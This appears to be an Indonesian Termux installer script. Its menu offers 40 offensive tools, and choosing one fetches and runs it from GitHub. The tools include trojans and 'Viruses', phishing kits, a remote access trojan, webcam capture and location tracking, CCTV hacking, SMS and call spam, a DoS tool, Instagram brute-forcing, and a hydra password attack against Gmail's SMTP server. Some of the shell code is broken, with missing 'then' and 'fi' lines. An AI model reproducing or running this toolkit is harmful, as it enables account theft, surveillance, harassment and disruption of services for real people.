#!/system/xbin/bash

clear
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'


echo "Tols Installer V,1 :) " |lolcat
sleep 2

echo "=======================================" |lolcat
echo  "Author   : MU4R1F      " |lolcat
echo  "Support  : Underground Science           " |lolcat
echo "=======================================" |lolcat

echo "<~DAFTAR TOLS~>" |lolcat

echo ""
echo "1.  Facebot"
echo "============================" | lolcat
echo "2.  Trojans"
echo "============================" | lolcat
echo "3.  RED_HAWK"
echo "============================" | lolcat
echo "4.  Bughunter"
echo "============================" | lolcat
echo "5.  Tebasindex"
echo "============================" | lolcat
echo "6.  DORK-SCANNER"
echo "============================" | lolcat
echo "7.  Sadap Camera"
echo "============================" | lolcat
echo "8.  Viruses"
echo "============================" | lolcat
echo "9.  Tembak Kuota"
echo "============================" | lolcat
echo "10.  Mod Cashtree"
echo "============================" | lolcat
echo "11.  Hack Lokasi"
echo "============================" | lolcat
echo "12.  Buat User Login"
echo "============================" | lolcat
echo "13.  LITESCRIPT"
echo "============================" | lolcat
echo "14.  Hack CCTV"
echo "============================" | lolcat
echo "15.  SPAM TELEPON & WA"
echo "============================" | lolcat
echo "16.  SPAM SMS"
echo "============================" | lolcat
echo "17.  Auto React FB"
echo "============================" | lolcat
echo "18.  SQLMap"
echo "============================" | lolcat
echo "19.  Melacak IP"
echo "============================" | lolcat
echo "20.  Deface WEBDAV"
echo "============================" | lolcat
echo "21.  WEEMAN"
echo "============================" | lolcat
echo "22.  Hunner Framework"
echo "============================" | lolcat
echo "23.  Lazymux"
echo "============================" | lolcat
echo "24.  Torshammer"
echo "============================" | lolcat
echo "25.  Phising Sosmed"
echo "============================" | lolcat
echo "26.  Brute Force Instagram"
echo "============================" | lolcat
echo "27.  A-Rat"
echo "============================" | lolcat
echo "28.  Admin Login"
echo "============================" | lolcat
echo "29.  Admin Finder"
echo "============================" | lolcat
echo "30.  Hack Instagram"
echo "============================" | lolcat
echo "31.  Hack Twitter"
echo "============================" | lolcat
echo "32.  Hack Email"
echo "============================" | lolcat
echo "33.  BlackEye"
echo "============================" | lolcat
echo "34.  OSIF"
echo "============================" | lolcat
echo "35.  D-TECT"
echo "============================" | lolcat
echo "36.  RECONDOG"
echo "============================" | lolcat
echo "37.  DarkSploit"
echo "============================" | lolcat
echo "38.  NetHunter"
echo "============================" | lolcat
echo "39.  USERRECON"
echo "============================" | lolcat
echo "40.  ASCII ART MAPS"
echo "============================" | lolcat
echo "0. EXIT"
echo "============================" | lolcat

echo ""
echo "╭─Silahkan Pilih gak pilih hape lu meledak" |lolcat
read -p "╰─#" pil;

if [ $pil = 1 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/GUNAWAN18ID/facebot
cd facebot
pip2 install -r requirements.txt
python2 facebot.py
fi

if [ $pil = 2 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/R133F/Trojans
cd Trojans
python2 trojans.py
fi

if [ $pil = 3 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php
fi

if [ $pil = 4 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/thehackingsage/bughunter
cd bughunter
python2 bughunter.py
fi

if [ $pil = 5 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/tukangiseng/Tebasindex
cd Tebasindex
cd Tebas
sh Tebas.sh
fi

if [ $pil = 6 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/KALSELeXploit/DORK-SCANNER
cd DORK-SCANNER
php scan.php
fi

if [ $pil = 7 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/thelinuxchoice/saycheese
cd saycheese
bash saycheese.sh
fi

if [ $pil = 8 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/Ractomes/Viruses
cd Viruses
python2 malicious.py
fi

if [ $pil = 9 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/Bintang73/tembaktembakan.git
cd tembaktembakan
python dor.py
fi

if [ $pil = 10 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/radenvodka/cashtree
cd cashtree
nano cashtree.php
php cashtree.php
fi

if [ $pil = 11 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/thelinuxchoice/locator
cd locator
bash locator.sh
fi

if [ $pil = 12 ]
clear
figlet WAIT.. |lolcat
git clone https://github.com/Harisgitama/termux-loginv2fx.git
cd termux-loginv2
python2 setup.py
cd $HOME
python2 useradd.py
fi

if [ $pil = 13 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/4L13199/LITESCRIPT
cd LITESCRIPT
python2 LITESCRIPT.py
mv hasilsc.html /sdcard
fi

if [ $pil = 14 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/kancotdiq/ipcs
cd ipcs
python2 scan.py
fi

if [ $pil = 15 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/siputra12/prank
cd prank
ls
php call.php
php wa.php

if [ $pil = 16 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/joss24242/SpamSms
cd SpamSms
python2 mantan.py
fi

if [ $pil = 17 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/AMVengeance/FB-React.git
chmod +x FB-React -R
cd FB-React
./start
fi

if [ $pil = 18 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python2 sqlmap.py -u "url website" --dbs
fi

if [ $pil = 19 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/maldevel/IPGeolocation
cd IPGeolocation
python ipgeolocation.py -t IPtarget
fi

if [ $pil = 20 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/MRRUXHANTAC270/Deface-W3BD4F
cd Deface-W3BD4F
sh Webdav.sh
fi

if [ $pil = 21 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/evait-security/weeman
cd weeman
chmod 777 weeman.py
python2 weeman.py
fi

if [ $pil = 22 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/b3-v3r/Hunner
cd Hunner
chmod 777 hunner.py
python hunner.py
fi

if [ $pil = 23 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/Gameye98/Lazymux
cd Lazymux
chmod +x lazymux.py
python2 lazymux.py
fi

if [ $pil = 24 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/dotfighter/torshammer.git
cd torshammer
python2 torshammer.py
fi

if [ $pil = 25 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/thelinuxchoice/shellphish
cd shellphish
bash shellphish.sh
fi

if [ $pil = 26 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/rezadkim/instabrutal
chmod 777 instabrutal.py
pip2 install requests
python2 install instabrutal.py
fi

if [ $pil = 27 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/Xi4u7/A-Rat
cd A-Rat
chmod +x A-Rat.py
python2 A-Rat.py
fi

if [ $pil = 28 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/BlackCyberAnonim/B-LOGIN
cd B-LOGIN
cp log.py $HOME
cd $HOME
nano log.py
fi

if [ $pil = 29 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/GUNAWAN18ID/admin-login.git
cd admin-login
python admin-login.py
fi

if [ $pil = 30 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/storiku/instahack
cd instahack
bash ig.sh
fi

if [ $pil = 31 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/Lexiie/Pulse.git
sudo pip2 install pysocks mechanize
sudo python2 pulse.py situs user wordlist
fi

if [ $pil = 32 ]
then
clear
figlet WAIT.. |lolcat
pkg install hydra -y
cd $HOME directory
hydra-l yourmail@gmail.com -P yourwordlist.txt -s 465 -S -v -V -t 1 smtp.gmail.com smtp
fi

if [ $pil = 33 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/thelinuxchoice/blackeye
chmod +x blackeye.sh
sh blackeye.sh
fi

if [ $pil = 34 ]
then
clear
figlet WAIT.. |lolcat
pkg install python2
git clone https://github.com/ciku370/OSIF
cd OSIF
pip2 install -r requirements.txt
python2 osif.py
fi

if [ $pil = 35 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/shawarkhanethicalhacker/D-TECT
cd D-TECT
chmod +x d-tect.py
python2 d-tect.py
fi

if [ $pil = 36 ]
then
clear
figlet WAIT.. |lolcat
apt install git
git clone https://github.com/UltimateHackers/ReconDog
cd ReconDog
chmod +x dog.py
Python2 dog.py
fi

if [ $pil = 37 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/LOoLzeC/DarkSploit
cd DarkSploit
cd install
sh installtermux.sh
pip2 install -r requirements.txt
python2 DrXp.py
fi

if [ $pil = 38 ]
then
clear
figlet WAIT.. |lolcat
apt install git
git clone https://github.com/Hax4us/Nethunter-In-Termux.git
cd Nethunter
chmod +x kalinethunter
./kalinethunter
./startkali.sh
fi

if [ $pil = 39 ]
then
clear
figlet WAIT.. |lolcat
pkg install curl
pkg install openssh
pkg install python python2 -y
git clone https://github.com/thelinuxchoice/userrecon
cd userrecon
bash userrecon.sh
fi

if [ $pil = 40 ]
then
clear
figlet WAIT.. |lolcat
pkg install perl
git clone https://github.com/x-xsystm/maps.git
cd maps
perl maps.pl
fi

if [ $pil = 0 ]
then
clear
figlet WAIT.. |lolcat
sleep 1
clear
exit
echo "Support: Underground Science"|lolcat
echo "Created By : Mu4R1f"  |lolcat
exit
fi

